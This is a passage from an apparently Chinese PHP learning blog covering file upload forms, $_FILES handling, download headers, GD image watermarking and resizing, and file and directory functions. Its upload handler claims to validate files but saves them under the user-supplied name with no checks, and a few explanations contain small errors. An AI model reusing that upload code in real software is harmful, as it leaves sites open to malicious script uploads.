&#39;c&#39;.<br>译文：<br>打开该文件进行读写; 否则它的行为与“ c”相同。</td></tr><tr><td>&#39;e&#39;</td><td>Set close-on-exec flag on the opened file descriptor. Only available in PHP compiled on POSIX.1-2008 conform systems.<br>译文：<br>在打开的文件描述符上设置 close-on-exec 标志。(7.0.16, 7.1.2     新增 ‘e’ 选项。)</td></tr></tbody></table><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="html部分要求"><a href="#html部分要求" class="headerlink" title="html部分要求"></a>html部分要求</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 提到最顶，设置下文件编码</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// form是表单</span></span><br><span class="line"><span class="comment">// method=&quot;post&quot;                    上传的模式为post</span></span><br><span class="line"><span class="comment">// action=&quot;upload.php&quot;              上传到某个php文件进行处理</span></span><br><span class="line"><span class="comment">// enctype=&quot;multipart/form-data&quot;     文件上传所必须的属性(必须要的)：指示表单将包含二进制数据</span></span><br><span class="line"><span class="comment">// form内部部分就不多做解释了</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;upload.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                               <span class="comment">// 限制上传文件的类型        限制上传文件的大小，单位是字节</span></span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> accept=<span class="string">&quot;.jpg,.gif,.png&quot;</span> maxlength=<span class="string">&quot;2097152&quot;</span>&gt;</span><br><span class="line">  &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;Upload&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="php部分"><a href="#php部分" class="headerlink" title="php部分"></a>php部分</h2><h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>配置php.ini，实现文件的上传功能。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务器接受http上传</span></span><br><span class="line">file_uploads = On</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">memory_limit</span><br><span class="line"><span class="comment">// 设置上传大小限制</span></span><br><span class="line">upload_max_filesize = <span class="number">2</span>M</span><br><span class="line"><span class="comment">// post请求允许的最大数据量</span></span><br><span class="line">post_max_size = <span class="number">2</span>M</span><br><span class="line"><span class="comment">// 置文件上传时的临时存储目录。如果不设置，则使用系统默认的临时目录。</span></span><br><span class="line">upload_tmp_dir = /tmp</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制内存的使用阈值，超过则出现致命错误停止运行</span></span><br><span class="line"><span class="comment">// 默认值通常为 128M</span></span><br><span class="line">memory_limit = <span class="number">256</span>M</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="FILES（处理上传的form文件数据）"><a href="#FILES（处理上传的form文件数据）" class="headerlink" title="$_FILES（处理上传的form文件数据）"></a>$_FILES（处理上传的form文件数据）</h3><p>用于处理上传文件的超全局变量/多维数组。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $_FILES使用的前提：form表单的form标签处必须要有enctype=&quot;multipart/form-data&quot;</span></span><br><span class="line"><span class="comment">// 参数如下：</span></span><br><span class="line">    name: 文件的原始名称。</span><br><span class="line">    type: 文件的 MIME 类型。</span><br><span class="line">    tmp_name: 文件上传后存储在服务器上的临时文件名。</span><br><span class="line">    error: 文件上传过程中可能产生的错误代码。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_OK</span> (<span class="number">0</span>): 没有错误，文件上传成功。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_INI_SIZE</span> (<span class="number">1</span>): 上传的文件大小超过了 php.ini 中 upload_max_filesize 指令的限制。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_FORM_SIZE</span> (<span class="number">2</span>): 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 指令的限制。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_PARTIAL</span> (<span class="number">3</span>): 文件只有部分被上传。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_NO_FILE</span> (<span class="number">4</span>): 没有文件被上传。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_NO_TMP_DIR</span> (<span class="number">6</span>): 没有找到临时文件夹。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_CANT_WRITE</span> (<span class="number">7</span>): 文件写入磁盘失败。</span><br><span class="line">            <span class="title function_ invoke__">UPLOAD_ERR_EXTENSION</span> (<span class="number">8</span>): PHP 扩展停止了文件上传。</span><br><span class="line">    size: 文件大小，以字节为单位。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="comment">// 进行文件上传的处理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件上传相关函数"><a href="#文件上传相关函数" class="headerlink" title="文件上传相关函数"></a>文件上传相关函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_uploaded_file</span>() <span class="comment">//函数用于检查指定的文件是否是通过 HTTP POST 上传的,是，则true，否，则false</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>() <span class="comment">//函数用于将上传的文件从临时目录移动到指定目录,只移动HTTP POST上传的文件。</span></span><br><span class="line">&gt;&gt;&gt;下面是例子</span><br><span class="line"><span class="variable">$source</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 上传的临时文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$destination</span> = <span class="string">&#x27;path/to/destination&#x27;</span>; <span class="comment">// 文件移动到的目标路径</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$source</span>, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">    <span class="comment">// 文件移动成功</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 文件移动失败</span></span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt; 例子结束</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="创建处理上传文件的php文件"><a href="#创建处理上传文件的php文件" class="headerlink" title="创建处理上传文件的php文件"></a>创建处理上传文件的php文件</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// 获取上传的文件</span></span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取上传文件的基本信息</span></span><br><span class="line">  <span class="variable">$filename</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">  <span class="variable">$filetype</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">  <span class="variable">$filesize</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">  <span class="variable">$filetmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">  <span class="variable">$fileerror</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对上传文件进行验证和过滤</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$fileerror</span> === UPLOAD_ERR_OK) &#123;</span><br><span class="line">    <span class="comment">// 上传文件保存到服务器上的指定目录中</span></span><br><span class="line">    <span class="variable">$upload_dir</span> = <span class="string">&#x27;./uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$upload_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$filetmp</span>, <span class="variable">$upload_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回上传成功的反馈信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Upload success!&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 返回上传失败的反馈信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Upload failed!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p>使用header来实现使用php文件下载其他文件。（php相当于中转站）</p><h2 id="指定文件类型"><a href="#指定文件类型" class="headerlink" title="指定文件类型"></a>指定文件类型</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:MIME文件类型&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="指定下载文件的描述"><a href="#指定下载文件的描述" class="headerlink" title="指定下载文件的描述"></a>指定下载文件的描述</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:attachement;filename=&quot;文件名称&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="指定下载文件的大小"><a href="#指定下载文件的大小" class="headerlink" title="指定下载文件的大小"></a>指定下载文件的大小</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length:文件大小&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="读取文件内容输出至缓冲区"><a href="#读取文件内容输出至缓冲区" class="headerlink" title="读取文件内容输出至缓冲区"></a>读取文件内容输出至缓冲区</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>();</span><br></pre></td></tr></table></figure><h2 id="附header"><a href="#附header" class="headerlink" title="附header"></a>附header</h2><p>向服务端发送http报头。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">除了Content-Type头，还有许多其他的HTTP头可以使用<span class="title function_ invoke__">header</span>()函数设置，例如：</span><br><span class="line"></span><br><span class="line">    Content-Length：表示响应内容的长度。</span><br><span class="line">    Cache-Control：控制缓存的行为，例如是否缓存、缓存时间等。</span><br><span class="line">    Location：重定向浏览器到新的URL。</span><br><span class="line">    Expires：设置响应过期的时间，通常与Cache-Control一起使用。</span><br><span class="line">    Set-Cookie：设置Cookie信息。</span><br><span class="line"></span><br><span class="line">在使用<span class="title function_ invoke__">header</span>()函数时，需要注意以下几点：</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>()函数必须在页面输出之前调用，否则会出现<span class="string">&quot;Headers already sent&quot;</span>错误。</span><br><span class="line">    只能设置一个相同的HTTP头，如果设置多个相同的HTTP头，只有最后一个会生效。</span><br><span class="line">    在设置Location头时，需要注意不要输出任何内容，否则会出现<span class="string">&quot;Cannot modify header information&quot;</span>错误。</span><br><span class="line"></span><br><span class="line">总的来说，<span class="title function_ invoke__">header</span>()函数是一个非常有用的函数，可以帮助我们控制服务器返回的数据以及浏览器的行为。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他参数</span></span><br><span class="line">在PHP中，<span class="title function_ invoke__">header</span>()函数用于向客户端发送原始的HTTP头信息。它通常用于发送一些特殊的HTTP头信息，例如：响应状态码、重定向、缓存控制、字符集、内容类型、文件下载等。下面是一些常见的HTTP头参数及其含义：</span><br><span class="line"></span><br><span class="line">    响应状态码</span><br><span class="line"></span><br><span class="line">语法：<span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 Not Found&#x27;</span>);</span><br><span class="line"></span><br><span class="line">含义：设置HTTP响应的状态码。</span><br><span class="line"></span><br><span class="line">    重定向</span><br><span class="line"></span><br><span class="line">语法：<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://www.example.com/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">含义：设置重定向URL，浏览器会自动跳转到该URL。需要注意的是，重定向时必须使用绝对URL，否则可能会出现错误。</span><br><span class="line"></span><br><span class="line">    缓存控制</span><br><span class="line"></span><br><span class="line">语法：<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Cache-Control: no-cache, no-store, must-revalidate&#x27;</span>);</span><br><span class="line"></span><br><span class="line">含义：控制缓存的行为，例如是否缓存、缓存时间等。在上面的示例中，no-cache表示禁止缓存，no-store表示禁止存储缓存，must-revalidate表示必须重新验证缓存。</span><br><span class="line"></span><br><span class="line">    字符集</span><br><span class="line"></span><br><span class="line">语法：<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">含义：设置响应内容的字符集，通常与Content-Type一起使用。在上面的示例中，设置字符集为UTF-<span class="number">8</span>。</span><br><span class="line"></span><br><span class="line">    内容类型</span><br><span class="line"></span><br><span class="line">语法：<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html&#x27;</span>);</span><br><span class="line"></span><br><span class="line">含义：设置响应内容的类型。在上面的示例中，设置响应内容为HTML文档。</span><br><span class="line"></span><br><span class="line">    文件下载</span><br><span class="line"></span><br><span class="line">语法：<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;example.txt&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">含义：设置响应内容为文件下载，并指定下载的文件名。在上面的示例中，将文件下载的Content-Disposition头设置为attachment，并指定文件名为example.txt。</span><br><span class="line"></span><br><span class="line">    自定义头信息</span><br><span class="line"></span><br><span class="line">语法：<span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-My-Header: MyValue&#x27;</span>);</span><br><span class="line"></span><br><span class="line">含义：设置自定义的HTTP头信息。在上面的示例中，设置自定义的HTTP头信息X-My-Header，值为MyValue。</span><br><span class="line"></span><br><span class="line">需要注意的是，<span class="title function_ invoke__">header</span>()函数必须在页面输出之前调用，否则会出现<span class="string">&quot;Headers already sent&quot;</span>错误。同时，<span class="title function_ invoke__">header</span>()函数只能设置一个相同的HTTP头，如果设置多个相同的HTTP头，只有最后一个会生效。在设置Location头时，需要注意不要输出任何内容，否则会出现<span class="string">&quot;Cannot modify header information&quot;</span>错误。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-007</title>
      <link href="/2023/02/27/PHP-Study-007/"/>
      <url>/2023/02/27/PHP-Study-007/</url>
      
        <content type="html"><![CDATA[<p>水印，缩放裁剪，文件和目录。</p><span id="more"></span><h1 id="水印"><a href="#水印" class="headerlink" title="水印"></a>水印</h1><p>补充了一点昨天那些相关函数的部分说明，不过相关补充写入了昨天的日志里，内容分割开的话可能队以后的阅读造成影响，故不单独列出来了。</p><h2 id="文字水印"><a href="#文字水印" class="headerlink" title="文字水印"></a>文字水印</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="string">&#x27;/phpstudy_pro/WWW/51CTO_Study/D01/Verification_Code/images/c01.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$color6</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="variable">$height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="comment">// 字体绝对路径（推荐）</span></span><br><span class="line"><span class="comment">// 当你相对路径看不到效果时，就使用绝对路径吧</span></span><br><span class="line"><span class="variable">$fontfile</span> = <span class="string">&quot;Captcha_module/font/CangJiGaoDeGuoMiaoHei/CangJiGaoDeGuoMiaoHei-CJgaodeguomh-2.ttf&quot;</span>;</span><br><span class="line"><span class="variable">$str_all</span> = <span class="string">&quot;CSDN@SYW_SEC&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取字体高度和宽度</span></span><br><span class="line"><span class="variable">$str_array</span> = <span class="title function_ invoke__">imagettfbbox</span>(<span class="number">15</span>, <span class="number">0</span>, <span class="variable">$fontfile</span>, <span class="string">&quot;CSDN@SYW_SEC&quot;</span>);</span><br><span class="line"><span class="variable">$strw</span> = <span class="title function_ invoke__">abs</span>(<span class="variable">$str_array</span>[<span class="number">0</span>] - <span class="variable">$str_array</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$strh</span> = <span class="title function_ invoke__">abs</span>(<span class="variable">$str_array</span>[<span class="number">3</span>] - <span class="variable">$str_array</span>[<span class="number">5</span>]);</span><br><span class="line"><span class="comment">// echo $strw . &quot; - &quot; . $strh;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagettftext</span>(<span class="variable">$img</span>, <span class="number">15</span>, <span class="number">0</span>, (<span class="variable">$width</span> - <span class="variable">$strw</span> - <span class="number">10</span>), (<span class="variable">$height</span> - <span class="variable">$strh</span>), <span class="variable">$color6</span>, <span class="variable">$fontfile</span>, <span class="variable">$str_all</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$img</span>);</span><br></pre></td></tr></table></figure><p><img src="c04.jpg" alt="img"></p><h2 id="图片水印"><a href="#图片水印" class="headerlink" title="图片水印"></a>图片水印</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line"><span class="comment">// 大图资源(目标资源)</span></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="string">&quot;Verification_Code/images/c01.jpg&quot;</span>);</span><br><span class="line"><span class="variable">$color1</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 水印图片</span></span><br><span class="line"><span class="variable">$water</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="string">&quot;Verification_Code/images/CSDN_LOGO.png&quot;</span>);</span><br><span class="line"><span class="comment">// 水印图像宽高</span></span><br><span class="line"><span class="variable">$imgw</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="variable">$imgh</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$img</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标资源的宽高</span></span><br><span class="line"><span class="variable">$waterw</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$water</span>);</span><br><span class="line"><span class="variable">$waterh</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$water</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不带透明度参数拷贝图片当水印</span></span><br><span class="line"><span class="title function_ invoke__">imagecopy</span>(<span class="variable">$img</span>, <span class="variable">$water</span>, <span class="variable">$imgw</span> - <span class="variable">$waterw</span>, <span class="variable">$imgh</span> - <span class="variable">$waterh</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$waterw</span>, <span class="variable">$waterh</span>);</span><br><span class="line"><span class="comment">// 带透明度参数拷贝图片当水印</span></span><br><span class="line"><span class="comment">// imagecopymerge($img, $water, $imgw - $waterw, $imgh - $waterh, 0, 0, $waterw, $waterh, 50);</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$img</span>);</span><br></pre></td></tr></table></figure><p><img src="c03.jpg" alt="img"><br><img src="c01.jpg" alt="img"></p><h1 id="截取与缩放"><a href="#截取与缩放" class="headerlink" title="截取与缩放"></a>截取与缩放</h1><h2 id="截取"><a href="#截取" class="headerlink" title="截取"></a>截取</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line"><span class="variable">$simg</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="string">&#x27;images/w2.png&#x27;</span>);</span><br><span class="line"><span class="variable">$eimg</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">500</span>, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$eimg</span>, <span class="variable">$simg</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"><span class="comment">// 显示截取的图像</span></span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$eimg</span>);</span><br><span class="line"><span class="comment">// imagepng($eimg);</span></span><br><span class="line"><span class="comment">// 销毁</span></span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$simg</span>);</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$eimg</span>);</span><br></pre></td></tr></table></figure><p><img src="c05.jpg" alt="img"></p><h2 id="缩略"><a href="#缩略" class="headerlink" title="缩略"></a>缩略</h2><p>这种类型的缩放会比原图占用的资源更少。 <strong>尺寸变小</strong> ，占用的 <strong>容量</strong> 也 <strong>变小</strong> 。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line"><span class="comment">// 缩略后的宽</span></span><br><span class="line"><span class="variable">$width</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$simg</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="string">&#x27;images/w2.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$simgw</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$simg</span>);</span><br><span class="line"><span class="variable">$simgh</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$simg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过($width/$height=$simgw/$simgh)的等式算出缩略后的高</span></span><br><span class="line"><span class="variable">$height</span> = <span class="variable">$width</span> / (<span class="variable">$simgw</span> / <span class="variable">$simgh</span>);</span><br><span class="line"><span class="comment">// 创建对应的图像资源</span></span><br><span class="line"><span class="variable">$eimg</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="variable">$width</span>, <span class="variable">$height</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始缩略</span></span><br><span class="line"><span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$eimg</span>, <span class="variable">$simg</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$simgw</span>, <span class="variable">$simgh</span>);</span><br><span class="line"><span class="comment">// 显示图像资源</span></span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$eimg</span>);</span><br><span class="line"><span class="comment">// 销毁</span></span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$eimg</span>);</span><br></pre></td></tr></table></figure><p><img src="c06.jpg" alt="c06"></p><h1 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">返回的值是布尔值，是则返回<span class="literal">true</span>，否则返回<span class="literal">false</span></span><br><span class="line">判断是文件：<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;文件名或者路径文件名&#x27;</span>);</span><br><span class="line">判断是目录：<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;路径或者路径文件目录&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="判断普通文件和目录"><a href="#判断普通文件和目录" class="headerlink" title="判断普通文件和目录"></a>判断普通文件和目录</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_exists</span>()   <span class="comment">// 检查文件或目录是否存在</span></span><br><span class="line"><span class="title function_ invoke__">filesize</span>()      <span class="comment">// 取得普通文件的大小   单位字节</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_readable</span>()   <span class="comment">// 判断给定的文件名是否可读</span></span><br><span class="line"><span class="title function_ invoke__">is_writable</span>()   <span class="comment">// 判断给定的文件名是否可写</span></span><br><span class="line"><span class="title function_ invoke__">filectime</span>()     <span class="comment">// 获取文件的创建时间</span></span><br><span class="line"><span class="title function_ invoke__">filemtime</span>()     <span class="comment">// 获取文件的修改时间</span></span><br><span class="line"><span class="title function_ invoke__">fileatime</span>()     <span class="comment">// 获取文件的上次访问时间</span></span><br><span class="line"><span class="title function_ invoke__">stat</span>()          <span class="comment">// 获取文件的大部分属性值</span></span><br></pre></td></tr></table></figure><h2 id="目录基本操作"><a href="#目录基本操作" class="headerlink" title="目录基本操作"></a>目录基本操作</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span>:返回当前文件名路径</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">basename</span>();   <span class="comment">//返回路径中的文件名部分，有后缀</span></span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">dirname</span>();    <span class="comment">//返回路径中的目录部分 </span></span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">pathinfo</span>();   <span class="comment">//返回文件路径的信息(花式拆解，把文件名和后缀分开，又把文件和路径分开，最终集合为数组)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目录系列：目录句柄</span></span><br><span class="line"><span class="number">4</span>.<span class="title function_ invoke__">opendir</span>();    <span class="comment">//打开目录句柄(里面放路径，返回资源类型的数据)</span></span><br><span class="line"><span class="number">5</span>.<span class="title function_ invoke__">readdir</span>();    <span class="comment">//从目录句柄中读取条目,返回目录中下一个文件的文件名</span></span><br><span class="line"><span class="comment">// 读取.和..后，按字母排序读取下面的文件名。直到读完返回false。</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.<span class="title function_ invoke__">rewinddir</span>();  <span class="comment">//倒回目录句柄</span></span><br><span class="line"><span class="comment">// 和上面相反，直接回到最初状态</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.<span class="title function_ invoke__">closedir</span>();   <span class="comment">//关闭目录句柄</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>.<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;name&#x27;</span>,权限,<span class="keyword">bool</span>);      <span class="comment">//新建目录，权限默认0777;bool为true时，可以进行递归创建目录</span></span><br><span class="line"><span class="number">9</span>.<span class="title function_ invoke__">rmdir</span>();              <span class="comment">//删除指定的空目录</span></span><br><span class="line"><span class="number">10</span>.<span class="title function_ invoke__">scandir</span>();           <span class="comment">//列出指定路径中的文件和目录</span></span><br><span class="line"><span class="comment">// 这条命令有点类似于windows的dir</span></span><br></pre></td></tr></table></figure><h2 